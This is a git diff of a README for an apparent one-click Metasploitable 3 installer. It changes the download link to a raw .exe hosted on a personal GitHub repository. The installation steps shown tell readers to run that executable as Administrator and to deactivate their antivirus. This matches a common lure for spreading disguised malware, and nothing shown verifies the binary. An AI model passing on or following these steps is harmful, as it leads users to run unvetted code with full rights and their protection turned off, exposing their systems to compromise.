@@ -23,7 +23,7 @@ A one-click installer for Metasploitable 3 that automatically handles all depend
 
 ## Installation
 
-1. Download the latest `Metasploitable3-Installer.exe` from [Here](Metasploitable3.exe)
+1. Download the latest `Metasploitable3-Installer.exe` from [Here](https://github.com/ch-ammar-abid/Metasploitable-3/raw/refs/heads/main/Metasploitable3.exe)
 2. Run the executable as Administrator
 3. Deactivate the Antivirus
 
